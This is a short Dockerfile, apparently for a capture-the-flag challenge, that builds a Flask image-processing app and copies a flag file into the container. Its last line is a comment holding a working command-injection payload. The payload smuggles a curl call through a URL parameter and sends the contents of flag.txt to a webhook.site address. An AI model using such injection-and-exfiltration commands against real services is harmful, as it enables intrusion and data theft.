FROM python

WORKDIR /app

RUN pip install Pillow opencv-python flask

RUN apt-get update
RUN apt-get install ffmpeg libsm6 libxext6 libgl1-mesa-glx -y

RUN addgroup ggez && \
	adduser --disabled-password --gecos '' wtfrudoinghere && \
	adduser wtfrudoinghere ggez

COPY ./app/entrypoint .
COPY ./app/fryer ./fryer
COPY ./app/wsv.py .
COPY ./app/templates ./templates
COPY flag.txt .

RUN mkdir /app/uploads && chown -R wtfrudoinghere:ggez /app/uploads
USER wtfrudoinghere

EXPOSE 5000
CMD ["/app/entrypoint"]

# curl http://172.24.0.10:5000/?f=;curl%20https://webhook.site/268e21e0-4945-4d27-ae14-5d14276f33c7/`cat%20flag.txt`;

